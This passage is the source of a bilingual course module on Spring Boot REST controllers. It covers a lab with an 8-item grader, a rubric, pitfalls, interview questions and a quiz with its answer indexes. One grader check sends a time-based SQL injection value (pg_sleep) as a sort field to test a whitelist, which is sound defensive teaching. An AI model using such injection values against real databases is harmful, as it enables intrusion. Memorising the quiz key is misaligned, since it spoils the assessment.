  <div class="kv"><span class="k">POST /labs/{labId}/devices</span><span class="v">Body <code>{name, type, serialNo}</code>. 201 + header <code>Location</code> mà client GET được. <code>id</code>, <code>status</code> (luôn <code>AVAILABLE</code>) và <code>labId</code> do server quyết. Trùng <code>serialNo</code> ⇒ 409.</span></div>
  <div class="kv"><span class="k">DELETE /devices/{id}</span><span class="v">204; sau đó GET ⇒ 404.</span></div>
</div>

<h3>Chuẩn bị</h3>
<ul>
  <li>Java 21, Maven, Docker, và một shell có <code>curl</code>, <code>python3</code>, <code>bc</code> cho bộ chấm (Linux, macOS, WSL hoặc Git Bash).</li>
  <li>Bật PostgreSQL và nạp dữ liệu: <code>docker run -d --name labflow-pg -e POSTGRES_PASSWORD=sb -e POSTGRES_DB=labflow -p 5432:5432 postgres:16</code>, rồi <code>docker exec -i labflow-pg psql -U postgres -d labflow &lt; schema.sql</code>. <strong>Nạp lại <code>schema.sql</code> trước mỗi lần chấm</strong> — bộ chấm tạo và xoá thiết bị.</li>
  <li>Chạy ứng dụng: <code>mvn spring-boot:run</code>; ở terminal khác: <code>bash cham.sh 8080</code>.</li>
  <li>Sửa <code>DeviceController</code> và thêm tệp mới tuỳ ý. Không sửa <code>schema.sql</code> hay <code>cham.sh</code>.</li>
</ul>
${XML46_POM}
${PROPS46}
${SQL46}
${MA46_APP}
${MA46_DEVICE}
${MA46_START}
${giai('Bộ chấm — cham.sh (đọc, đừng sửa)', BASH46_CHAM)}
<p>Chạy nguyên bản khởi đầu:</p>
${OUT46_START}

<h3>Tám mục kiểm, và mỗi mục đến từ bài nào</h3>
<ol>
  <li><strong>201 + Location đi theo được</strong> — bài 4.1 và 4.5. Bộ chấm GET đúng URL trong header.</li>
  <li><strong>Không lộ trường nội bộ</strong> — bài 4.2: một DTO response, không phải class <code>Device</code>.</li>
  <li><strong>Chặn mass assignment</strong> — bài 4.2: client gửi <code>"id":999</code> và <code>"status":"MAINTENANCE"</code>; thiết bị được tạo phải có id do server cấp và <code>AVAILABLE</code>.</li>
  <li><strong>Trùng serial ⇒ 409</strong> — bài 4.5: để ràng buộc <code>UNIQUE</code> quyết định, rồi dịch exception.</li>
  <li><strong>Trang có giới hạn và có phong bì</strong> — bài 4.5.</li>
  <li><strong>Lab không tồn tại ⇒ 404</strong> — danh sách rỗng sẽ nói "lab này không có thiết bị", đó là một sự thật khác.</li>
  <li><strong>DELETE ⇒ 204, rồi 404</strong> — bài 4.1 và 4.5 (dòng không tồn tại không được thành 500).</li>
  <li><strong>Danh sách trắng cho sort</strong> — bài 4.5: bộ chấm gửi <code>(SELECT 1 FROM pg_sleep(2))</code> và chờ 400 trong chưa tới một giây.</li>
</ol>

<h3>Đạt khi</h3>
<p><code>== 8/8 ==</code> ba lần liên tiếp, mỗi lần nạp lại <code>schema.sql</code> trước khi chạy.</p>

<h3>Thang điểm (10 điểm)</h3>
<div class="kv-grid">
  <div class="kv"><span class="k">Đúng — 6 điểm</span><span class="v">8/8 ba lần: 6 điểm; 7/8: 4; 6/8: 3; ít hơn: 1 điểm cho mỗi hai PASS.</span></div>
  <div class="kv"><span class="k">Thiết kế DTO — 2 điểm</span><span class="v">Record request và response tách riêng; không class nào ánh xạ bảng xuất hiện trong chữ ký hàm controller; record request có đúng các trường client được gửi.</span></div>
  <div class="kv"><span class="k">Để cơ sở dữ liệu quyết — 1 điểm</span><span class="v">Phát hiện trùng bằng ràng buộc (không SELECT rồi mới INSERT); cột sắp xếp lấy từ bảng tra, không bao giờ nối chuỗi.</span></div>
  <div class="kv"><span class="k">Vệ sinh HTTP — 1 điểm</span><span class="v">Mã trạng thái dựng bằng <code>ResponseEntity</code> (không trả 200 kèm thông báo lỗi bên trong), Location dựng từ request, không viết cứng <code>http://localhost:8080</code>.</span></div>
</div>

<h3>Bẫy ta gặp khi thử lab</h3>
<p><strong>Một Location trông có vẻ đúng.</strong> Dòng tự nhiên nhất, <code>ServletUriComponentsBuilder.fromCurrentRequest().path("/{id}")</code>, nối id vào URL <em>hiện tại</em> — với endpoint này là <code>/labs/1/devices</code>:</p>
${OUT46_BAY}
<p>Mọi mục khác đều qua, header kết thúc bằng <code>/devices/121</code> và liếc qua thấy ổn — nhưng không ai GET được nó. Đó là lý do bộ chấm đi theo liên kết. Hãy dựng URL của chính tài nguyên (<code>fromCurrentContextPath()</code> + <code>/devices/{id}</code>).</p>
<ul>
  <li><strong><code>.single()</code> trên dòng không có</strong> ném <code>EmptyResultDataAccessException</code> ⇒ 500 (mục 7 của bản khởi đầu). Dùng <code>.optional()</code> và <code>ResponseEntity.of(…)</code>.</li>
  <li><strong>Chỉ kiểm lab ở GET</strong>: POST vào lab không tồn tại chạm khoá ngoại và cho 500, trừ khi bạn kiểm trước hoặc dịch <code>DataIntegrityViolationException</code>.</li>
  <li><strong>Quên cột phá hoà</strong> khi sắp theo <code>type</code>: mỗi lab có 15 thiết bị cùng loại, nên các trang chồng lên nhau (bài 4.5). Bộ chấm không bắt; người chấm theo thang điểm sẽ bắt.</li>
</ul>

<h3>Nâng cao (không bắt buộc)</h3>
<ul>
  <li><code>PATCH /devices/{id}</code> với <code>{status}</code>, chỉ nhận <code>AVAILABLE</code>, <code>IN_USE</code>, <code>MAINTENANCE</code> (khác ⇒ 400).</li>
  <li><code>GET /admin/devices/{id}</code> trả DTO thứ hai có giá mua (Chương 9 sẽ bảo vệ nó).</li>
  <li>Phân trang keyset cho danh sách thiết bị, với con trỏ mờ.</li>
  <li>Cùng hợp đồng đó viết bằng Express 5 — rồi so xem mỗi bản cần bao nhiêu dòng cho mục 2, 3 và 8.</li>
</ul>

${giai('Xem một lời giải', `${MA46_DTOS}
${MA46_GIAI}
${OUT46_GIAI}`)}

<h3>🎤 Chương 4 — phỏng vấn viên sẽ hỏi</h3>
<ol>
  <li><strong>"Kể lại chuyện gì xảy ra từ lúc request HTTP tới cho đến khi hàm controller của bạn chạy."</strong> — Luồng làm việc của Tomcat ⇒ các filter servlet (kể cả Spring Security) ⇒ DispatcherServlet ⇒ tra ánh xạ (mẫu cụ thể nhất) ⇒ interceptor ⇒ chuẩn bị tham số và bộ chuyển đổi thông điệp (Jackson) ⇒ hàm của bạn ⇒ giá trị trả về được chuyển đổi theo content negotiation ⇒ exception resolver / advice ⇒ quay ngược qua interceptor và filter.</li>
  <li><strong>"Vì sao dùng DTO? Không phải là mã trùng lặp sao?"</strong> — DTO là hợp đồng API: nó quyết định cái gì lộ ra (không trường nội bộ), cái gì được ghi (không mass assignment), độ ổn định (đổi lược đồ không làm hỏng client) và tránh bẫy tuần tự hoá (vòng lặp, lazy loading). MapStruct bớt phần lớn chỗ trùng lặp.</li>
  <li><strong>"Bạn dùng mã trạng thái nào cho tạo, sửa, xoá, lỗi kiểm tra dữ liệu, trùng, không tìm thấy?"</strong> — 201 + Location; 200 (hoặc 204); 204; 400 (hoặc 422 cho lỗi ngữ nghĩa); 409; 404 — cộng 401/403 cho xác thực, 405/406/415 do Spring tự sinh.</li>
  <li><strong>"Phân trang một bảng lớn thế nào?"</strong> — Giới hạn cỡ trang, sắp xếp tất định với cột duy nhất phá hoà, danh sách trắng cho trường sắp xếp; offset cho danh sách nhỏ/quản trị, con trỏ keyset cho danh sách lớn hoặc vô hạn; cân nhắc bỏ hoặc lưu đệm <code>count(*)</code>.</li>
  <li><strong>"Một client di động thử lại POST sau khi hết giờ chờ và người dùng có hai lượt đặt. Sửa thế nào?"</strong> — Idempotency-Key: giành khoá một cách nguyên tử bằng ràng buộc unique, lưu và phát lại response, từ chối dùng lại khoá với body khác, cho khoá hết hạn; thêm một ràng buộc nghiệp vụ (mỗi khung giờ một lượt đặt) làm tuyến phòng thủ cuối.</li>
</ol>

<h3>Nguồn</h3>
<ul>
  <li>Output ở trên: Lab4App (bản khởi đầu, lời giải, biến thể bẫy) trên Spring Boot 4.1.2 với PostgreSQL 16, Temurin 21.0.12.1; chấm bằng <code>cham.sh</code> (19/11/2026). Lời giải đạt 8/8 ba lần liên tiếp.</li>
</ul>
</div>
`;

const Q = (question, options, correctIndex) => ({ question, options, correctIndex, points: 1 });
const QUIZ4 = [
  Q('LabController has @GetMapping("/{id}") and @GetMapping("/count"), declared in that order. What answers GET /labs/count?|||LabController có @GetMapping("/{id}") và @GetMapping("/count"), khai theo thứ tự đó. Hàm nào trả lời GET /labs/count?', [
    'one(long) — it was declared first|||one(long) — vì khai trước',
    'count() — the most specific pattern wins regardless of order|||count() — mẫu cụ thể nhất thắng, không phụ thuộc thứ tự',
    'Startup fails because of an ambiguous mapping|||Khởi động lỗi vì ánh xạ mơ hồ',
    '400, because "count" is not a long|||400, vì "count" không phải long',
  ], 1),
  Q('On Spring Boot 4, a client calls GET /labs/ (trailing slash) while the controller maps "/labs". Result?|||Trên Spring Boot 4, client gọi GET /labs/ (thừa dấu "/" cuối) trong khi controller ánh xạ "/labs". Kết quả?', [
    '200, same as /labs|||200, như /labs',
    '301 redirect to /labs|||301 chuyển hướng về /labs',
    '404 — trailing-slash matching is off by default since Spring Framework 6|||404 — từ Spring Framework 6 mặc định không khớp dấu "/" cuối',
    '405 Method Not Allowed|||405 Method Not Allowed',
  ], 2),
  Q('A class is annotated @Controller (not @RestController) and a method returns the String "hello" without @ResponseBody. In an app with no template engine, what does GET /hello give?|||Một class có @Controller (không phải @RestController) và một hàm trả chuỗi "hello" mà không có @ResponseBody. Trong ứng dụng không có template engine, GET /hello cho gì?', [
    '200 with body hello|||200 với body hello',
    '500 — "hello" is treated as a view name; Circular view path|||500 — "hello" bị hiểu là tên view; Circular view path',
    '404 Not Found|||404 Not Found',
    '406 Not Acceptable|||406 Not Acceptable',
  ], 1),
  Q('An endpoint takes @RequestBody Student (the entity, with a role field). A client adds "role":"ADMIN" to the JSON. What is this vulnerability called?|||Một endpoint nhận @RequestBody Student (entity, có trường role). Client thêm "role":"ADMIN" vào JSON. Lỗ hổng này tên gì?', [
    'IDOR|||IDOR',
    'Mass assignment|||Mass assignment (gán hàng loạt)',
    'SQL injection|||SQL injection',
    'CSRF|||CSRF',
  ], 1),
  Q('Spring Boot 4 (Jackson 3). The request DTO is record BookingRequest(String labCode, int seats). The JSON omits "seats". What happens?|||Spring Boot 4 (Jackson 3). DTO request là record BookingRequest(String labCode, int seats). JSON không có "seats". Chuyện gì xảy ra?', [
    'seats = 0, request succeeds|||seats = 0, request thành công',
    'seats = null|||seats = null',
    '400 — FAIL_ON_NULL_FOR_PRIMITIVES is enabled by default in Jackson 3|||400 — Jackson 3 bật sẵn FAIL_ON_NULL_FOR_PRIMITIVES',
    '500 NullPointerException|||500 NullPointerException',
  ], 2),
  Q('The same code returns LocalDateTime.ofInstant(T, ZoneId.systemDefault()) for T = 2026-11-20T01:00:00Z. The server runs in a Docker container with default settings. What does the client see?|||Cùng đoạn mã trả LocalDateTime.ofInstant(T, ZoneId.systemDefault()) với T = 2026-11-20T01:00:00Z. Server chạy trong container Docker để mặc định. Client thấy gì?', [
    '"2026-11-20T08:00:00"|||"2026-11-20T08:00:00"',
    '"2026-11-20T01:00:00" — containers run in UTC unless configured|||"2026-11-20T01:00:00" — container chạy UTC nếu không cấu hình',
    '"2026-11-20T01:00:00Z"|||"2026-11-20T01:00:00Z"',
    'A number of milliseconds|||Một con số mili giây',
  ], 1),
  Q('A controller throws an exception that a @RestControllerAdvice converts to 409. Which HandlerInterceptor callback does NOT run?|||Controller ném exception và một @RestControllerAdvice đổi nó thành 409. Hàm nào của HandlerInterceptor KHÔNG chạy?', [
    'preHandle|||preHandle',
    'postHandle|||postHandle',
    'afterCompletion|||afterCompletion',
    'All three run|||Cả ba đều chạy',
  ], 1),
  Q('You need a request ID on every log line, including requests that end in 404 without any controller. Where should you set it?|||Bạn cần mã request trên mọi dòng log, kể cả request kết thúc bằng 404 mà không có controller nào. Đặt nó ở đâu?', [
    'In a servlet Filter (OncePerRequestFilter) with MDC|||Trong một Filter của servlet (OncePerRequestFilter) với MDC',
    'In each controller method|||Trong từng hàm controller',
    'In @ControllerAdvice|||Trong @ControllerAdvice',
    'In an @Aspect around services|||Trong một @Aspect bọc các service',
  ], 0),
  Q('GET /bookings?page=9999&size=100 uses LIMIT 100 OFFSET 999900 on 1 000 000 rows. Why is it much slower than WHERE id > 999900 ORDER BY id LIMIT 100?|||GET /bookings?page=9999&size=100 dùng LIMIT 100 OFFSET 999900 trên 1 000 000 dòng. Vì sao nó chậm hơn nhiều so với WHERE id > 999900 ORDER BY id LIMIT 100?', [
    'OFFSET disables indexes|||OFFSET tắt chỉ mục',
    'The database still produces and discards the first 999 900 rows|||Cơ sở dữ liệu vẫn phải sinh ra rồi vứt 999 900 dòng đầu',
    'JDBC fetches all rows into Java|||JDBC kéo hết các dòng về Java',
    'It is not slower|||Không chậm hơn',
  ], 1),
  Q('Ten identical POST /bookings requests with the same Idempotency-Key arrive at the same moment. The server claims keys with INSERT … ON CONFLICT DO NOTHING on a primary key. How many bookings are created?|||Mười request POST /bookings giống hệt, cùng một Idempotency-Key, tới cùng lúc. Server giành khoá bằng INSERT … ON CONFLICT DO NOTHING trên khoá chính. Có bao nhiêu lượt đặt được tạo?', [
    'Ten|||Mười',
    'Between one and ten, depending on timing|||Từ một tới mười, tuỳ thời điểm',
    'Exactly one|||Đúng một',
    'Zero — all requests conflict|||Không — mọi request đều xung đột',
  ], 2),
];

const L = (n, slug, en, vi, description, content) => ({
  title: `4.${n} — ${en}|||4.${n} — ${vi}`, slug, type: 'LESSON', isFreePreview: false, description, content,
});

export default {
  title: 'Chapter 4 — REST controllers|||Chương 4 — REST controller',
  description: 'Endpoint HTTP với @RestController và bảng ánh xạ, DTO bằng record (đệ quy JSON, lộ hash, mass assignment, MapStruct), Jackson 3 và content negotiation (lệch bảy tiếng, lồng sâu, body 30 MB), đường đi của request qua filter/DispatcherServlet/interceptor (giả mạo log, Log4Shell), mã trạng thái + phân trang offset/con trỏ + Idempotency-Key đo trên PostgreSQL một triệu dòng — chạy thật trên Spring Boot 4.1.2, so với Express 5, lab API thiết bị LabFlow có bộ chấm 8 mục và câu hỏi phỏng vấn.',
  lessons: [
    L(1, 'sb-4-1-restcontroller', '@RestController and request mapping', '@RestController và request mapping',
      'Năm phương thức trên /labs, bảng ánh xạ in lúc khởi động, @PathVariable/@RequestParam đổi kiểu (400), 405 + Allow, dấu "/" cuối và chữ hoa ⇒ 404, @Controller thiếu @ResponseBody, so với Express 5 (thứ tự route, NaN), vượt quyền vì bảo vệ và router đọc URL khác nhau (CVE-2016-5007, issue #28552).',
      L41_EN + L41_VI),
    L(2, 'sb-4-2-dto', 'DTOs: why not expose entities directly', 'DTO: vì sao không trả thẳng entity',
      'Trả entity: JSON đệ quy trả 200 với dữ liệu bị cắt, cách sửa @JsonIgnore làm lộ hash bcrypt, mass assignment phong admin (GitHub 2012), hợp đồng API dính lược đồ; DTO bằng record, FAIL_ON_UNKNOWN_PROPERTIES, MapStruct và bẫy bookingCount = 0.',
      L42_EN + L42_VI),
    L(3, 'sb-4-3-requestbody', '@RequestBody, Jackson 3 and content negotiation', '@RequestBody, Jackson 3 và content negotiation',
      '415/406/400 kèm dòng log thật, mặc định thật của Jackson 3 (thiếu int ⇒ 400, xếp chữ cái, ISO), Instant vs LocalDateTime và lỗi lệch bảy tiếng khi container chạy UTC, JSON/XML theo Accept, @JsonProperty/@JsonInclude/snake_case, lồng sâu và body 30 MB, CVE-2022-42003, CVE-2017-7525.',
      L43_EN + L43_VI),
    L(4, 'sb-4-4-dispatcher-servlet', 'The request pipeline: DispatcherServlet, filters and interceptors', 'Đường đi của request: DispatcherServlet, filter và interceptor',
      'Ngăn xếp gọi thật từ Tomcat tới controller, filter mã request + MDC, filter giới hạn body 413, interceptor và @RestControllerAdvice với request thường/exception/404, virtual thread, giả mạo dòng log và Log4Shell, log có cấu trúc ECS, so với middleware Express.',
      L44_EN + L44_VI),
    L(5, 'sb-4-5-thiet-ke-rest', 'REST design: status codes, pagination, idempotency', 'Thiết kế REST: mã trạng thái, phân trang, idempotency',
      '201 + Location tuyệt đối, 204, 409 từ ràng buộc unique; phân trang offset vs con trỏ trên một triệu dòng (132 ms vs 0,045 ms), size không giới hạn 84 MB, chèn SQL mù qua ORDER BY, Optus 2022; Idempotency-Key: 10 request song song ⇒ đúng một lượt đặt.',
      L45_EN + L45_VI),
    L(6, 'sb-4-6-lab-4', 'Chapter 4 lab + interview questions', 'Lab chương 4 + câu hỏi phỏng vấn',
      'API thiết bị của LabFlow bằng DTO: 201 + Location dùng được, không lộ trường nội bộ, chặn mass assignment, 409, phân trang có giới hạn, 404 cho lab không tồn tại, 204, danh sách trắng cho sort; bộ chấm 8 mục chạy với PostgreSQL (khởi đầu 0/8), thang điểm, lời giải ẩn, câu phỏng vấn chương 4.',
      L46_EN + L46_VI),
    {
      title: '4.7 — Chapter 4 quiz|||4.7 — Kiểm tra chương 4',
      slug: 'sb-4-7-quiz',
      type: 'QUIZ',
      isFreePreview: false,
      description: 'Mười câu về độ cụ thể của ánh xạ, dấu "/" cuối, @Controller thiếu @ResponseBody, mass assignment, thiếu kiểu nguyên thuỷ trong Jackson 3, múi giờ container, postHandle, filter cho mã request, OFFSET sâu và Idempotency-Key.',
      content: `
<div class="ml-en">
<span class="eyebrow">Chapter 4 · Quiz</span>
<h2>Check what stuck</h2>
<p class="lead">Every question comes from a request you saw answered in this chapter — a 404 for a trailing slash, a student turned admin, a booking shown seven hours off, ten retries that made one booking. If you miss one, rerun the curl command from that lesson and read the response again.</p>
</div>
<div class="ml-vi">
<span class="eyebrow">Chương 4 · Kiểm tra</span>
<h2>Xem thử đọng lại được gì</h2>
<p class="lead">Câu nào cũng lấy từ một request bạn đã thấy được trả lời trong chương — một 404 vì thừa dấu "/", một sinh viên thành admin, một lượt đặt lệch bảy tiếng, mười lần thử lại chỉ tạo một lượt đặt. Sai câu nào thì chạy lại lệnh curl của bài đó và đọc lại response.</p>
</div>
`,
      quiz: { timeLimitSeconds: 900, questions: QUIZ4 },
    },
  ],
};
